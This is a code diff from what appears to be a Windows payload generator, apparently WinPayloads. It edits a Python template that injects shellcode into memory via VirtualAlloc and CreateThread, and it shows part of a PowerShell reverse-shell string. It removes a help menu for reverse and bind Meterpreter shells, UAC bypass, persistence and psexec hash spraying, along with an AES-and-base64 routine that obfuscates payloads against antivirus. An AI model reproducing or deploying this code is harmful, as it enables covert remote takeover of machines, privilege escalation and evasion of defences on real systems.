@@ -205,15 +205,13 @@ class SHELLCODE(object):
         "$send = ([text.encoding]::ASCII).GetBytes('='*30 + $output + '='*30);"
         "$stream.Write($send,0,$send.Length);$client.Close();break}}}")
 
-    injectwindows = """
-#/usr/bin/python
-import ctypes as changeme
+    injectwindows = """import ctypes
 shellcode = bytearray('%s')
-ptr = changeme.windll.kernel32.VirtualAlloc(changeme.c_int(0),changeme.c_int(len(shellcode)),changeme.c_int(0x3000),changeme.c_int(0x40))
-buf = (changeme.c_char * len(shellcode)).from_buffer(shellcode)
-changeme.windll.kernel32.RtlMoveMemory(changeme.c_int(ptr),buf,changeme.c_int(len(shellcode)))
-ht = changeme.windll.kernel32.CreateThread(changeme.c_int(0),changeme.c_int(0),changeme.c_int(ptr),changeme.c_int(0),changeme.c_int(0),changeme.pointer(changeme.c_int(0)))
-changeme.windll.kernel32.WaitForSingleObject(changeme.c_int(ht),changeme.c_int(-1))
+ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
+buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))
+ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
+ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 """
 
 
@@ -227,129 +225,6 @@ class FUNCTIONS(object):
             return IP
         except:
             return None
-
-    def winpayloads_help(self):
-        print_payloads =(
-"""
-+ Windows Reverse Shell
-    - This payload will give the attacker a stageless reverse tcp shell
-    - A listener will be automatically started using NetCat
-
-+ Windows Reverse Meterpreter
-    - This payload will give the attacker a staged reverse tcp meterpreter shell
-    - A listener will be automatically started using Metasploit
-    - All MODULES are avalible for this payload
-
-+ Windows Bind Meterpreter
-    - This payload will give the attacker a staged bind tcp meterpreter shell
-    - Connection to the bind port will be automatically started using Metasploit
-    - All MODULES are avalible for this payload
-
-+ Windows Reverse Meterpreter HTTPS
-    - This payload will give the attacker a staged reverse HTTPS meterpreter shell
-    - A listener will be automatically started using Metasploit
-    - All MODULES are avalible for this payload
-
-+ Windows Reverse Meterpreter DNS
-    - This payload will give the attacker a staged reverse tcp meterpreter shell with DNS name resolution
-    - Good for dynamic ip addresses and persistence payloads
-    - A listener will be automatically started using Metasploit
-    - All MODULES are avalible for this payload
-""")
-        print_modules =(
-"""
-+ UAC Bypass
-    - This Module only works on Local Administrator Accounts
-    - Using this module, PowerShellEmpire's UAC Bypass will execute on the target
-    - This will bypass uac and create another session running as administrator
-    - https://github.com/PowerShellEmpire/Empire
-
-+ Priv Esc checks
-    - Using this module, PowerShellEmpire's PowerUp AllChecks will execute on the target
-    - This will find common privesc vulnerabilities on the target
-    - https://github.com/PowerShellEmpire/Empire
-
-+ Persistence
-    - This module will run a powershell script on the target
-    - Persistence adds registry keys and to the startup folder to automatically run the payload everytime the target boots
-""")
-        print_deployment =(
-"""
-+ SimpleHTTPServer
-    - The payload will be hosted locally on a HTTP server
-
-+ Psexec and Spraying
-    - Spray hashes to find a vulnerable target
-    - Psexec the payload to the target
-    - Runs as system
-""")
-        print "\n|=------=|"
-        print "|" + t.bold_green + "PAYLOADS" + t.normal + "|"
-        print "|=------=|"
-        print print_modules
-        print "\n|=-----=|"
-        print "|" + t.bold_green + "MODULES" + t.normal + "|"
-        print "|=-----=|"
-        print print_payloads
-        print "\n|=--------=|"
-        print "|" + t.bold_green + "DEPLOYMENT" + t.normal + "|"
-        print "|=--------=|"
-        print print_deployment
-
-
-    def __init__(self):
-        self.BLOCK_SIZE = 32
-        self.PADDING = '{'
-        self.imports = list()
-        self.output = list()
-
-    def randKey(self, bytes):
-        return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$^&()*&[]|,./?") for x in range(bytes))
-
-    def randVar(self):
-        return ''.join(random.choice(string.ascii_letters) for x in range(3)) + "_" + ''.join(random.choice("0123456789") for x in range(3))
-
-    def pad(self, s):
-        return str(s) + (self.BLOCK_SIZE - len(str(s)) % self.BLOCK_SIZE) * self.PADDING
-
-    def EncodeAES(self, c, s):
-        return base64.b64encode(c.encrypt(self.pad(s)))
-
-    def DecodeAES(self, c, e):
-        return c.decrypt(base64.b64decode(e)).rstrip(self.PADDING)
-
-    def DoPyCipher(self, filecontents):  # Adaptation of PyHerion 1.0 By: @harmj0y
-        key, iv = self.randKey(32), self.randKey(16)
-
-        input = filecontents.split('\n')
-
-        newoutput = ''
-
-        for line in input:
-            if not line.startswith("#"):
-                if "import" in line:
-                    self.imports.append(line.strip())
-                else:
-                    self.output.append(line)
-
-        cipherEnc = AES.new(key, AES.MODE_CBC, iv)
-
-        encrypted = self.EncodeAES(cipherEnc, "\n".join(self.output))
-
-        self.imports.append("from base64 import b64decode")
-        self.imports.append("from Crypto.Cipher import AES")
-
-        random.shuffle(self.imports)
-        randomstring = ''.join(random.choice(string.lowercase) for x in range(random.randrange(500,1000)))
-        randomimport = ''.join(random.choice(string.lowercase) for x in range(10))
-        randombytes = ''
-        for i in randomstring:
-            randombytes += hex(ord(i))
-        newoutput = "%s = \"%s\"\n" % (randomimport,randombytes) + ";".join(self.imports) + "\n"
-
-        newoutput += "exec(b64decode(\"%s\"))" % (base64.b64encode(
-            "exec(AES.new(\"%s\", AES.MODE_CBC, \"%s\").decrypt(b64decode(\"%s\")).rstrip('{'))\n" % (key, iv, encrypted)))
-        return newoutput
 
     def ServePayload(self, payloaddirectory):
         try:
